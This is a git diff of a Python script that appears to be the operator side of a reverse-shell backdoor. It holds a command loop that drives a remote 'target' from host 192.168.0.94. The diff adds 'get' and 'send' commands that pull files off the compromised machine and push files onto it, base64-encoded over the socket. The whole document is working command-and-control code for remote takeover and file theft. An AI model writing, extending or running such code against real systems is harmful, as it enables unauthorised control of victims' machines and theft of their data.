@@ -3,6 +3,7 @@ import socket
 from termcolor import colored
 import json
 from sys import exit
+import base64
 
 addr = None
 HOST = '192.168.0.94'
@@ -35,10 +36,24 @@ def shell(_s, _target, _addr):
 			exit(1)
 			break
 		elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
-			# reliable_send(_target, 'pwd')
+			# reliable_send(_target, 'pwd') # if linux
+			# reliable_send(_target, 'cd')  # if windows
 			# result = reliable_recv(_target)
 			# print('Changed to directory: ', result)
 			continue
+		elif cmd[:3] == 'get' and len(cmd[4:]) > 1:
+			with open(cmd[4:], 'wb') as f:
+				file_data = reliable_recv(_target)
+				f.write(base64.b64decode(file_data))
+				f.close()
+		elif cmd[:4] == 'send' and len(cmd[5:]) > 1:
+			try:
+				with open(cmd[5:], 'rb') as f:
+					file_data = f.read()
+					reliable_send(_target, base64.b64encode(file_data))
+			except:
+				failed = 'Failed to Upload'
+				reliable_send(_target, base64.b64encode(failed))
 		else:
 			result = reliable_recv(_target)
 			print('------------------\n', result, '------------------\n')
